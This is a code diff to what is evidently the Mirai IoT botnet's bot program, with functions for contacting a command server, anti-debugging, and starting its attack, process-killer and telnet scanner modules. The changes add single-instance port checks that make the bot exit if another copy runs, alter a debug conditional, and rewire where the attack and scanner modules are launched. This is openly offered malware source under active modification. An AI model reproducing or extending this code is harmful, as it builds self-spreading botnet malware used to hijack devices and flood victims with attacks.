@@ -24,6 +24,8 @@
 #include "util.h"
 #include "resolv.h"
 
+static void check_and_exit_self(void);
+static void check_and_exit_white(void);
 static void anti_gdb_entry(int);
 static void resolve_cnc_addr(void);
 static void establish_connection(void);
@@ -37,6 +39,49 @@ BOOL pending_connection = FALSE;
 void (*resolve_func)(void) = (void (*)(void))util_local_addr; // Overridden in anti_gdb_entry
 
 ipv4_t LOCAL_ADDR;
+
+void check_and_exit_self()
+{
+   int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0){
+        printf("Socket error occurred!\r\n");
+    }
+    struct sockaddr_in addr;
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(SINGLE_INSTANCE_PORT);
+    addr.sin_addr.s_addr = INADDR_ANY;
+
+    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
+        printf("Malicious not detected!\r\n");
+        close(sock);
+    } else {
+        printf("Malicious detected! Exitting...\r\n");
+        close(sock);
+        exit(0);
+    }
+}
+
+void check_and_exit_white()
+{
+   int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0){
+        printf("Socket error occurred!\r\n");
+    }
+    struct sockaddr_in addr;
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(SINGLE_INSTANCE_PORT_WHITE);
+    addr.sin_addr.s_addr = INADDR_ANY;
+
+    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
+        printf("White not detected!\r\n");
+        close(sock);
+    } else {
+        printf("White detected! Exitting...\r\n");
+        close(sock);
+        exit(0);
+    }
+}
+
 
 #ifdef DEBUG
 static void segv_handler(int sig, siginfo_t *si, void *unused)
@@ -102,6 +147,8 @@ int main(int argc, char **args)
         perror("sigaction");
 #endif
 
+    check_and_exit_self();
+    check_and_exit_white();
     LOCAL_ADDR = util_local_addr();
 
     srv_addr.sin_family = AF_INET;
@@ -146,7 +193,7 @@ int main(int argc, char **args)
     write(STDOUT, "\n", 1);
     table_lock_val(TABLE_EXEC_SUCCESS);
 
-#ifndef DEBUG
+#ifdef DEBUG
     int f = fork();
     if (f > 0){
         printf("Parent\n");
@@ -157,6 +204,15 @@ int main(int argc, char **args)
         // close(STDIN);
         // close(STDOUT);
         // close(STDERR);
+#endif 
+
+        attack_init();
+        killer_init();
+#ifdef MIRAI_TELNET
+#ifdef INIT_SCANNER
+        scanner_init();
+#endif
+#endif
 
         while (TRUE)
         {
